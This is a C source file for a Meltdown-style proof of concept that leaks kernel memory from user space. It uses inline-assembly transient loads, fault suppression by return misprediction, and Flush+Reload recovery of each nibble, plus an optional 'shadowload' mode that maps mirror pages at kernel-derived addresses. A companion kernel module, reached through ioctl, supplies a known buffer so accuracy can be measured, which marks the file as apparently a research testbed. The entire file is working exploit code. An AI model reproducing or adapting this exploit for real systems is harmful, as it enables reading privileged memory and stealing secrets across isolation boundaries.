#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>

#include "kernel_module/meltdown_module.h"

#include "common.h"

#define PAGE_SIZE 4096

#define TARGET_OFFSET 2560

static uint64_t kernel_buffer_size;
static uint64_t threshold;


// Taken from https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c
// ---------------------------------------------------------------------------
//

#define meltdown_nonull_lower                                                  \
  asm volatile("1:"                                                            \
               "movq (%%rsi), %%rsi\n"                                         \
               "movzx (%%rcx), %%rax\n"                                        \
               "andq $15, %%rax\n"                                             \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(address), "b"(meltdown_region), "S"(0)                    \
                   : "rax");
                   
#define meltdown_nonull_higher                                                 \
  asm volatile("1:"                                                            \
               "movq (%%rsi), %%rsi\n"                                         \
               "movzx (%%rcx), %%rax\n"                                        \
               "shr $4, %%rax\n"                                               \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(address), "b"(meltdown_region), "S"(0)                    \
                   : "rax");

#define speculation_start(label) asm goto ("call %l0" : : : "memory" : label##_retp); 
#define speculation_end(label) asm goto("jmp %l0" : : : "memory" : label); label##_retp: asm goto("lea %l0(%%rip), %%rax\nmovq %%rax, (%%rsp)\nret\n" : : : "memory","rax" : label); label: asm volatile("nop");

uint8_t* meltdown_region;

static uint8_t meltdown_recover() {
    uint8_t best = 0;
    uint64_t best_time = 999999;
    for(int i = 0; i < 16; i++) {
        int mix_i = ((i * 167) + 13) & 15;
        uint64_t time = probe(&meltdown_region[PAGE_SIZE * mix_i]);
        if(time < best_time && time < threshold) {
            best = mix_i;
            best_time = time;
        }
        flush(&meltdown_region[PAGE_SIZE * mix_i]);
    }
    return best;
}

static __attribute__((noinline)) uint8_t meltdown_leak_byte(uint64_t address) {
    uint8_t byte = 0;
    mfence();
    // suppress fault by return misprediction
    speculation_start(l)
        meltdown_nonull_lower
    speculation_end(l)
    mfence();
    byte |= meltdown_recover();
    
    mfence();
     // suppress fault by return misprediction
    speculation_start(h)
        meltdown_nonull_higher
    speculation_end(h)
    mfence();
    byte |= meltdown_recover() << 4;
    
    return byte;
}

static void meltdown_leak_cacheline(uint64_t address, uint8_t* out) {
    for(uint64_t offset = 0; offset < CACHE_LINE_SIZE; offset ++) {
        out[offset] = meltdown_leak_byte(address + offset);
    }
}

#ifdef SHADOWLOAD


void load_gadget_start();
void load_gadget_end();

// mirrors the address that is accessed by gadget
static uint8_t* mirror_buffer;
static void (*maccess_wrapper)(void*);

static void shadowload(int module_fd, uint64_t kernel_buffer_address, int64_t offset) {
    int64_t stride = offset - GADGET_OFFSET + 56;
    if(stride == -1352 || stride == 1528 || stride == 2040) stride -= 56;
    //if(stride == -2048) stride += 56;
    //if(stride == 1024) stride += 56;
    
    for(int i = 0; i < 5; i++) {
        if(stride > 0){
            maccess_wrapper(mirror_buffer);
            mfence();
            maccess_wrapper(mirror_buffer + stride);
            mfence();
            maccess_wrapper(mirror_buffer + stride * 2);
            mfence();
            maccess_wrapper(mirror_buffer + stride * 3);
            if(stride >= 1280){
                mfence();
                maccess_wrapper(mirror_buffer + stride * 4);
            }
            mfence();
        } else if(stride <= -1408) {
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride * 2);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride * 3);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride * 4);
            mfence();
        } else {
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride * 2);
            mfence();
            maccess_wrapper(mirror_buffer + 4096 - 64 + stride * 3);
            mfence();
        }
        // one access in kernel
        ioctl(module_fd, CMD_GADGET, 0);
        mfence();
    }
}

#endif /* SHADOWLOAD */

static uint64_t get_time_ns() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC_RAW, &t);
    return t.tv_sec * 1000000000ull + t.tv_nsec;
}

static void leak_buffer(int module_fd, uint64_t kernel_buffer_address) {
    uint64_t saved_seed = rand64();
    seed = saved_seed;
    uint8_t* leaked_buffer = malloc(kernel_buffer_size);
    
    ioctl(module_fd, CMD_RESET, seed);

    #ifdef SINGLE_LINE
        for(int i = 0; i < TARGET_OFFSET; i++) {
            while(!(uint8_t)rand64());
        }
        saved_seed = seed;
    #endif /* SINGLE_LINE */
    
    #ifdef FLUSHING
    ioctl(module_fd, CMD_FLUSH, 0);
    #endif /* FLUSHING */

    mfence();
    volatile uint64_t leak_start = get_time_ns();
    mfence();
    for(uint64_t offset = 0; offset < kernel_buffer_size; offset += CACHE_LINE_SIZE) {
        #ifdef SINGLE_LINE
            // always leak first cache line
            #ifdef SHADOWLOAD
            shadowload(module_fd, kernel_buffer_address, TARGET_OFFSET);
            #endif /* SHADOWLOAD */
            meltdown_leak_cacheline(kernel_buffer_address + TARGET_OFFSET, &leaked_buffer[offset]);
        #else // leak whole buffer
            #ifdef SHADOWLOAD
            shadowload(module_fd, kernel_buffer_address, offset);
            #endif /* SHADOWLOAD */
            meltdown_leak_cacheline(kernel_buffer_address + offset, &leaked_buffer[offset]);
        #endif /* SINGLE LINE */
    }
    mfence();
    volatile uint64_t leak_end = get_time_ns();
    mfence();
    
    printf("leaking took %zu ns.\n", leak_end - leak_start);
    
    uint64_t cacheline = 0;
    uint64_t cur_correct = 0;
    seed = saved_seed;
    for(uint64_t offset = 0; offset < kernel_buffer_size; offset ++) {
        
        #ifdef SINGLE_LINE
            if(offset % CACHE_LINE_SIZE == 0) {
                seed = saved_seed;
            }
        #endif /* SINGLE_LINE */
        
        uint8_t expected = rand64();
        while(!expected) expected = rand64();
        cur_correct += expected == leaked_buffer[offset];
    
        if(offset % CACHE_LINE_SIZE == CACHE_LINE_SIZE - 1) {
            printf("correct for cache_line %zu: %zu\n", cacheline, cur_correct);
            cur_correct = 0;
            cacheline ++;
        }
    }
}


int main(int argc, char** argv) {
    
    // meltdown setup
    meltdown_region = mmap(NULL, 4096 * 16, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_HUGETLB, 0, 0);
    
    if(meltdown_region == MAP_FAILED) {
        printf("No huge pages enabled\n");
        return -1;
    }

    memset(meltdown_region, 1, 4096 * 16);
    for(int i = 0; i < 16; i++) flush(meltdown_region + i * 4096);
    // generic setup
    threshold = calculate_threshold() + 40;
    
    int module_fd = open(MELTDOWN_MODULE_DEVICE_PATH, O_RDONLY);
    
    if(module_fd < 0) {
        fputs("unable to open module!\n", stderr);
        return -1;
    }
    
    
    struct meltdown_kernel_info info;
    
    // get required information for kernel
    ioctl(module_fd, CMD_INFO, &info);
    
    uintptr_t kernel_buffer_address = info.kernel_buffer;
    uintptr_t kernel_load_address   = info.kernel_access;       // only required for shadowload
    
    kernel_buffer_size    = info.kernel_buffer_size;
    
    printf("kernel load   at: 0x%016zx\n", kernel_load_address  );
    printf("kernel buffer at: 0x%016zx\n", kernel_buffer_address);
    
    #ifdef SHADOWLOAD
    // setup for shadowload, measure amount of rdtsc ticks this takes!
    mfence();
    volatile uint64_t setup_shadowload_start = get_time_ns();
    mfence();
    mirror_buffer = mmap((void*)((kernel_buffer_address & 0x7fffffffffffull) - kernel_buffer_size * 4), kernel_buffer_size * 9, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
    if(mirror_buffer == MAP_FAILED) {
        fprintf(stderr, "unable to allocate buffer of size 0x%zx to 0x%016zx\n", kernel_buffer_size * 9, (uint64_t)((kernel_buffer_address & 0x7fffffffffffull) - kernel_buffer_size * 4));
        return -1;
    }
    mirror_buffer += kernel_buffer_size * 4;
    uint8_t* code_buf = mmap((void*)((kernel_load_address & 0x7ffffffff000ull)), PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
    if(code_buf == MAP_FAILED) {
        fprintf(stderr, "unable to allocate gadget of size 0x%x to 0x%016zx\n", PAGE_SIZE * 2,  (uint64_t)(kernel_load_address & 0x7ffffffff000ull));
        return -1;
    }
    memcpy(code_buf + (kernel_load_address & 0xfff), load_gadget_start, (uint8_t*)load_gadget_end - (uint8_t*)load_gadget_start);
    mprotect(code_buf, PAGE_SIZE * 2, PROT_READ | PROT_EXEC);
    maccess_wrapper = (void*)(code_buf + (kernel_load_address & 0xfff));
    mfence();
    volatile uint64_t setup_shadowload_end = get_time_ns();
    mfence();
    printf("shadowload setup took %zu ns.\n", setup_shadowload_end - setup_shadowload_start);
    #endif /* SHADOWLAOD */
    
    leak_buffer(module_fd, kernel_buffer_address);
}

